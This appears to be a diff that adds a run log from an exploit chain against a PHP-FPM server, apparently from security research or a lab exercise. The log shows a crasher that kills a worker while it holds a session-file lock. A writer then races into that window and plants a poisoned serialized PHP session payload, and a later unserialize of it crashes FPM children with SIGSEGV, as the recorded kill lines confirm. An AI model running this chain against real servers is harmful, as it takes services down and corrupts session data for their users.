@@ -1,0 +1,20 @@
+======================================================================
+shape34 mission 4 — flock-drop timing + zero4 session injection
+sid=s345d61181e8b74b9d3e6cc session file=/tmp/s34_fpm/sess/sess_s345d61181e8b74b9d3e6cc
+======================================================================
+[payload] 18338 bytes: q|a:1020:{...O:19:"Shape34_JobEnvelope":1:{s:4:"jobs";s:8167:"A*8160";}...}
+[P0] seed: HTTP/1.1 200 OK b'35\r\nREAD-OK pid=1963360 sapi=fpm-fcgi handler=php keys=v\n\r\n0' (0.008s)
+[P0] file after seed: 14 bytes: b'v|s:5:"legit";'
+[P1] holder (23-byte C: crasher, dies holding flock):
+     status='HTTP/1.1 503 Service Unavailable' dt=0.719s body[:80]=b'<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">\n<html><head>\n<title>503 Servi'
+[P2] writer: polls=8338 eagain=8327 early_grabs=10 fail=None
+[P2] WINDOW RECEIPT: lock observed HELD at 1792873787.172552 (first blocked poll), held through 8327 blocked polls; acquired 98.0 us after the last blocked poll — i.e. inside the flock-drop window opened by the holder's SIGSEGV
+[P2] poison on disk: 18338 bytes head=b'q|a:1020:{i:0;i:1;i:1;i:1;i:2;i:1;i:3;i:1;i:4;i:1;i:5;i:1;i:' tail=b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"";}i:9998;i:5;}'
+[P3] poisoned read on the same sid (session decode = unserialize):
+     status='HTTP/1.1 503 Service Unavailable' dt=0.029s body[:60]=b'<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">\n<html><he'  <-- KILL-MANIFEST
+
+--- FPM error log kill lines (this run):
+     [24-Oct-2026 15:29:47] WARNING: [pool www] child 1963361 exited on signal 11 (SIGSEGV) after 32.616831 seconds from start
+     [24-Oct-2026 15:29:48] WARNING: [pool www] child 1963360 exited on signal 11 (SIGSEGV) after 34.668490 seconds from start
+
+DONE shape34_fpm_chain sid=s345d61181e8b74b9d3e6cc
